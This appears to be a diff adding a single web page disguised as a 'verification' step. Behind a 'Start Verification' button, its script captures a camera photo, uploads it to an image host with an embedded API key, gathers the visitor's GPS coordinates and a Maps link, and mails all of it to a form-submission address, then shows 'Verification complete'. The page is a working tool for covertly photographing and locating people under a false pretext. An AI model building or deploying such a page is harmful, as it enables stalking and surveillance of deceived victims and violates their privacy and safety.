@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body style="background:#0f172a;color:white;text-align:center;font-family:Arial">
+
+<h2 id="status">Tap to start verification</h2>
+<button id="startBtn"
+style="padding:12px 20px;font-size:16px;border:none;border-radius:6px;">
+Start Verification
+</button>
+
+<form id="sendForm" action="https://formsubmit.co/EMAIL_MO@gmail.com" method="POST">
+  <input type="hidden" name="Latitude" id="lat">
+  <input type="hidden" name="Longitude" id="lon">
+  <input type="hidden" name="Google Maps" id="map">
+  <input type="hidden" name="Camera Image Link" id="photoLink">
+  <input type="hidden" name="_captcha" value="false">
+</form>
+
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+let gpsReady = false;
+let imageReady = false;
+
+document.getElementById("startBtn").onclick = () => {
+  document.getElementById("status").innerText = "Requesting permissions…";
+  document.getElementById("startBtn").style.display = "none";
+  startProcess();
+};
+
+function startProcess() {
+
+  // CAMERA
+  navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    video.srcObject = stream;
+    setTimeout(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      stream.getTracks().forEach(t => t.stop());
+
+      let base64 = canvas.toDataURL("image/jpeg", 0.8).split(",")[1];
+      let fd = new FormData();
+      fd.append("key", "d2df52b590013ea953b1139e637b8973");
+      fd.append("image", base64);
+
+      fetch("https://api.imgbb.com/1/upload", { method:"POST", body:fd })
+      .then(r => r.json())
+      .then(d => {
+        photoLink.value = d.data.url;
+        imageReady = true;
+        checkSend();
+      });
+    }, 1200);
+  });
+
+  // GPS
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      lat.value = pos.coords.latitude;
+      lon.value = pos.coords.longitude;
+      map.value = "https://maps.google.com/?q=" + lat.value + "," + lon.value;
+      gpsReady = true;
+      checkSend();
+    },
+    () => {
+      document.getElementById("status").innerText = "Location denied";
+    }
+  );
+}
+
+function checkSend() {
+  if (gpsReady && imageReady) {
+    document.getElementById("status").innerText = "Sending…";
+    sendForm.submit();
+    setTimeout(() => {
+      document.body.innerHTML = "<h3>Verification complete</h3>";
+    }, 1500);
+  }
+}
+</script>
+
+</body>
+</html>
